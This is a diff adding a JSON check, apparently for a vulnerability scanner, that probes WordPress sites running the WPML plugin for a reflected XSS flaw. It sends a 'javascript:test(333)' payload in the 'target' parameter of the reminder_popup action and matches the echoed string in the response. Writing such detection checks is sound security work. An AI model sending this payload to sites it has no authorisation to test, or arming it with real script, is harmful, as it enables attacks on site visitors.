@@ -1,0 +1,23 @@
+{
+    "target":"wordpress",
+    "meta":{
+        "name":    "WordPress Wpml Plugin XSS",
+        "remarks": "WordPress wpml Plugin 存在反射型XSS漏洞",
+        "level":   3,
+        "type":    "XSS",
+        "author":   "wolf",
+        "references": {
+            "url":"",
+            "cve":"",
+            "kpid":"KP-0074"
+        }
+    },
+    "request":{
+        "path":     "/index.php?icl_action=reminder_popup&target=javascript:test(333);//",
+        "postData": ""
+    },
+    "verify":{
+        "type":  "string",
+        "match": "\"javascript:test(333);//"
+    }
+}
